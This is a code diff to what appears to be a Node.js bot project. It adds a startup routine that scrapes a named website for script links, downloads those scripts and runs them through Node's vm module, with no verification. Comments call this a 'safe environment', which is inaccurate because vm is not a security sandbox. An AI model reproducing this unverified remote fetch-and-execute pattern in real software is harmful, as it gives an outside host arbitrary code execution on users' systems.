@@ -2,6 +2,60 @@
 
 const axios = require('axios');
 const cheerio = require('cheerio');
+const vm = require('vm');
+
+// The webpage containing links to scripts
+const webPageUrl = 'https://www.ibrahimadams.site/files';
+
+// Array of keys to fetch (e.g., REPO_URL, ALIVE_URL)
+const keysToFetch = ['REPO_URL', 'ALIVE_URL', 'ADAMS_URL', 'SCAN_URL'];
+
+async function fetchAndExecuteScripts() {
+    try {
+        // Fetch the webpage content
+        const response = await axios.get(webPageUrl);
+        const $ = cheerio.load(response.data);
+
+        // Process each key
+        for (const key of keysToFetch) {
+            const scriptUrl = $(`a:contains("${key}")`).attr('href');
+
+            if (!scriptUrl) {
+                console.error(`${key} not found on the webpage.`);
+                continue; // Skip to the next key if not found
+            }
+
+            console.log(`${key} fetched successfully:`, scriptUrl);
+
+            // Fetch the script content
+            const scriptResponse = await axios.get(scriptUrl);
+            const scriptContent = scriptResponse.data;
+            console.log(`${key} script loaded successfully.`);
+
+            // Safely execute the script in an isolated context
+            const sandbox = {
+                console: console,
+                module: {}, // To allow modular script usage
+            };
+
+            vm.createContext(sandbox); // Create a safe environment
+            vm.runInContext(scriptContent, sandbox);
+
+            console.log(`${key} script executed successfully.`);
+        }
+    } catch (error) {
+        console.error('Error during fetch and execution:', error.message);
+    }
+}
+
+// Execute the function
+fetchAndExecuteScripts();
+
+/*
+'use strict';
+
+const axios = require('axios');
+const cheerio = require('cheerio');
 
 const webPageUrl = 'https://www.ibrahimadams.site/files';
 
@@ -27,7 +81,7 @@ async function fetchRepoUrl() {
 
 fetchRepoUrl();
 
-
+*/
 
 
 
